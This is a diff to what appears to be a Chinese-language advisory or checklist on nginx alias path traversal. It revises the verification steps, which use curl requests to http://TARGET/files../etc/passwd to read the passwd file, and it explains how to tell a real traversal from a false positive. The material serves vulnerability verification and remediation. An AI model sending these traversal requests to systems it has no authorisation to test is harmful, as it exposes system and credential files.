@@ -57,13 +57,14 @@ curl "http://TARGET/files../"
 ## 验证方法
 
 ```bash
-# 检查是否能读取 /etc/passwd
-curl -s "http://TARGET/files../etc/passwd" | grep "root:"
+# 判据：穿越请求的响应体里出现系统文件特征行，而不是网站自己的页面
+curl -s "http://TARGET/files../etc/passwd"
+# 出现 root:x:0:0:... 这类 passwd 行 → 穿越成功
+# 出现 [fonts]、for 16-bit app support → 读到的是 win.ini，Windows 同理成立
 
-# 对比正常请求和穿越请求的响应
-curl -sI "http://TARGET/files/"
-curl -sI "http://TARGET/files../"
-# 如果穿越请求返回 200 或目录列表，则漏洞存在
+# 对照：正常前缀请求只应拿到 alias 目录下的正常内容
+curl -s "http://TARGET/files/"
+# 反例：穿越请求返回的仍是站点的登录页 / 404 页 / SPA 首页 HTML，说明 alias 与 location 的斜杠是一致的，不存在穿越
 ```
 
 ## 修复建议
